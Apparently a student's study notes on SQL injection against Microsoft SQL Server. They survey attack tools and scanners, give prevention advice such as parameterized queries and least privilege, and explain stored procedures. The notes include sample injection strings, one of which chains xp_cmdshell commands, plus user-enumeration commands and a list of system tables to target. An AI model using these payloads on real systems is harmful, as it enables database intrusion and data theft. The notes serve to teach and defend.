- The Absinthe screen interface supports entering target data, such as the URL, Web application injectable parameters, cookies, delays, speedups, and injection options.

![Pasted Graphic](https://i.imgur.com/Byivv9Y.jpg)


**Automagic SQL**
- an automated injection tool
- against Microsoft SQL server that supports applying xp_cmdshell, uploading database files, and identifying and browsing tables in the database.


**Osql**
- replaced by sqlcmd, it is good to be aware of it.
- Osql interacts with a web server using ODBC and supports entering script files, Transact-SQL statements, and system procedures to the server database.


**sqlcmd**
- This utility supports entering Transact-SQL statement, script files, and system procedures in SQLCMD mode. It replaces Osql utility functions.


**SQLDict**
- application developed on Visual FoxPro 8.0 and supports the access of a variety of relational databases.
- It provides a common interface to execute SQL commands, implement and test for dictionary attacks, browse and list database tables, display table attributes, and export table attributes.


**SQLExec**
- This database utility can be used with a variety of servers to display database tables and fields and generate SQL commands for different functions.
- An SQLEXEC ( ) function in Visual FoxPro sends and executes an SQL command to a data source.


**SQLbf**
- An SQL server brute force / dictionary password cracker
- can be used to decrypt a password file or guess a password.
- can also be used to evaluate the strength of Microsoft SQL Server passwords ofﬂine.


**SQLSmack**
- A Linux-based tool
- it can execute remote commands on Microsoft SQL server.
- The commands are executed through the master.Xp_cmdshell but require a valid username and password.



**SSRS**
- Microsoft SQL Server Resolution Service is susceptible to buffer overﬂow attacks which can lead to the server executing arbitrary code, elevating privileges, and compromising the web server and database.


**SQL2.exe**
- This UDP buffer overﬂow remote hacking tool
- sends a crafted packet to UDP port 1434 on the SQL Server 2000 Resolution Service.
- The buffer overﬂow can result in the execution of malicious code in the server using the xp_cmdshell stored procedure.


for vulnerabilities:

**SQLBlock**
- This utility functions as an ODBC data source and inspects SQL statements to protect access to Web server databases.
- block dangerous and potentially harmful SQL statements and alert the system administrator.


**Acunetix Web Vulnerability Scanner (WVS)**
- automated scanner
- can work in conjunction with manual utilities to analyze Web applications for vulnerabilities
- can be used for penetration testing.


**WSDigger**
- an open source black box penetration testing Web services framework
- can test for cross site scripting, SQL injection and other types of attack vulnerabilities.


**WebInspect**
- automated tool
- can be used to identify Web application vulnerabilities by dynamically scanning these applications.
- As part of WebInspect’s vulnerability analysis, this utility will check for and report SQL injection vulnerabilities.

---


## SQL Injection Prevention and Remediation

SQL injection:
- attack a web server database, compromise critical information,
- expose the server and the database to a variety of malicious exploits;

Measures to mitigate SQL injection attacks.
- does not guarantee that SQL injection can be completely eliminated,
- but make it more difficult for hackers to conduct these attacks.

Defend attack:
- **privilege**:
  - Check for `accounts with weak / old passwords`
  - `Eliminate unnecessary accounts`
  - Monitor logging procedures.
  - Practice the `principle of least privilege regarding access to the database`.
    - not connecting the user to the database with the privileges of an owner of the database or of a superuser.
  - Run database applications from a low-privilege account.
  - Set security privileges on the database to the least needed.

- Ensure that **patches on the server are up to date** and properly installed.

- **Append and prefix quotes** to all client inputs.

- **Limit the use of dynamic SQL queries**, if possible.

- **Limit user inputs to one query**, preventing multi-statement attacks.

- **Input validation / filter input**. Server side validation.
  - Allow `only known good input`, remove bad elements.
  - May use white listing, list of text allowed.
  - `Sanitize client-supplied input` by filtering data according to least privilege, beginning with numbers and letters.
    - If it is necessary to include symbols, they should be converted to HTML substitutes.
  - Check to `make sure numeric inputs are integers` before passing them to SQL queries.
  - Screen input strings from users and URL parameters to eliminate single and double quotes, semicolons, back slashes, slashes, and similar characters.
  - Use bound parameters to create an SQL statement with placeholders such as `?` for each parameter, compile the statements, and execute the compilation later with actual parameters.

- **Proper error handling**
  - Instead of showing the errors, customized database server error messages, simply present a `generic error web page that doesn’t provide any details`.
  - prevents the attacker from gaining information from these errors.

- **Stored procedures / parameterized queries**
  - use parameterized queries instead of string concatenation within the query.
  - The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.
  - the user can't manipulate the string in the program.
    - Not copying the input directly into statement,
    - Values sent from the user side become parameters passed into the queries
      - `the input is passed to the stored procedure as a parameter`.
    - so comment characters won't eliminate the rest of the query string .
    - anything that tries to insert SQL statements by manipulating the quoting won't work
    - because the behavior as a parameter is different from just inserting text into a string value.
  - can be use for
    - `WHERE INSERT UPDATE`
    - `Table and column name` `ORDER BY` need other method, such as whitelist permitted input...
  - SQL statements written and stored on the database, can be called by applications.
  - a group of SQL statements that execute as a whole, like a mini-program.
  - database developers often use stored procedures with dynamic web pages.
  - parameterized stored procedure accepts input data as parameter.
    - Employ `needed stored procedures with embedded parameters through safe callable interfaces`.
    - `Remove stored procedures that are not needed`.
      - Candidates include:
      - `xp_sendmail`
      - `sp_makewebtask`
      - `master..xp_cmdshell`
      - `xp_startrnail`
    - Set appropriate privileges for stored procedures

  - The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.
  - Example:
    - searching for a book:
      - `Darril Gibson’; SELECT * From Customers;--`
    - The web app passes this search string to a **stored procedure**.
    - The stored procedure uses the search string in a SELECT statement like this:
      - SELECT * From Books Where Author = `"Darril Gibson’; SELECT * From Customers;--”`
    - interpreted as harmless text rather than malicious SQL statements.
    - It will look for books with name: `Darril Gibson’; SELECT * From Customers;--`.
    - Books don’t have names with SELECT statements embedded in them, so the query comes back empty.
  - Not Code signing: it is for code injection.

Depending on how well the database server is locked down (or not), SQL injection attacks may allow the attacker to access the structure of the database, all the data, and even modify data.
- In some cases, attackers have modified the price of products from several hundred dollars to just a few dollars, purchased several of them, and then returned the price to normal.


---

### Stored Procedures

Stored procedure:
- group of SQL statements that is designed to perform a specific task.
- This approach is an alternative to having the `application layer construct SQL statements dynamically`.
- A stored procedure can be `called by its name and pass the required parameters to the procedure`.

> SQL injection can also use stored procedures in a web server database.
> - SQL injection can be initiated if the stored procedure is not employed properly.

One useful procedure: `master.dbo.xp_cmdshe11`, incorporates follow syntax:
- `xp_cmdshell ( 'Command_string’ ) [, no_output]`
- The argument `' command_string'` is an SQL command.

Example:
- following construction provides employee info from an employee name search:
  - CREATE PROCEDURE SP_EmployeeSearch @Employeename varchar(200) = NULL AS
  - DECLARE @sql nvarchar(2000)
  - SELECT @sql = ' SELECT EmloyeeNum, EmployeeName, Title, Salary ' + ' FROM Employee Where '
  - IF @EmployeeName IS not NULL
  - SELECT @sql = @sql + ' EmployeeName LIKE ' ' ' + @employeename + ' ' ' '
  - EXEC (@sql)

  - In this procedure, the user provides the @employeename variable as input, which is then concatenated 连接的 with @sql.
- An SQL injection can be initiated by the user if he or she substitutes 1' or ‘1’=‘1’ ;exec master.dbo.xp_cmdshell 'dir' -- for the @employeename variable.
  - If this substitution is made, the SQL statement executed will be as follows:
  - SELECT EmployeeNum, EmployerNumber, ,EmployeeName FROM Employee Where EmployeeName LIKE ‘1’ or ‘1’=‘1’;exec master.dbo.xp_cmdshell 'dir' --
  - The result of this SQL query: access to all rows from the employee table.

Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:
- produces an SQL statement and an output file location.
- The syntax for master.dbo.sp_makewebtask is:
  - sp_makewebtask [@outputfile =] 'outputfile', [@query =] 'query'


![Screen Shot 2020-11-19 at 01.49.08](https://i.imgur.com/KfXpQHP.png)

![Screen Shot 2020-11-19 at 01.50.37](https://i.imgur.com/chM5COm.png)

---

### Extended Stored Procedures

Extended stored procedures:
- extend the functions available in the SQL Server environment
- and are useful in setting up and maintaining the database.
- Because of vulnerabilities in some of these procedures, these programs can be called to initiate and support SQL injection attacks.

A listing of some of these extended procedures is given as follows:
- `xp_availablemedia`: Provides a list of available computer drives
- `xp_dirtree`: Provides a directory tree
- `xp_enumdsn`: Identifies server ODBC data sources
- `xp_loginconfig`: Provides server security mode data
- `xp_mkecab`: Supports user generation of a compressed archive of files on the server and files that can be accessed by the server
- `exec master..xp_cmdshell 'dir ' `: Provides a listing of the SQL Server process current working directory
- `exec master..xp_cmdshell 'net1 user ‘`: Provides a list of all computer users
- `Custom extended stored procedures`: Can also be developed to execute as part of the SQL server code

---

### Sewer System Tables

It is helpful to know which system tables in the database server can be used as targets in SQL injection.


Summarizes the tables for 3 common database servers:

Sewer Database Tables

| ORACLE                        | MS ACCESS         | MS SQL     |
| ----------------------------- | ----------------- | ---------- |
| SYS.USER_CATALOG              | MSysACEs          | syscolumns |
| SYS.USER_CONSTRAINTS          | MsysQueries       | sysobjects |
| SYS.USER_OBJECTS SYS.TAB      | MsysObjects       |
| SYS.USER_TAB_COLUMNS          | MSysRelationships |
| SYS.USER_TABLES               |
| SYS.USER_TRIGGERS             |
| SYS.USER_VIEWS SYS.ALL_TABLES |


.
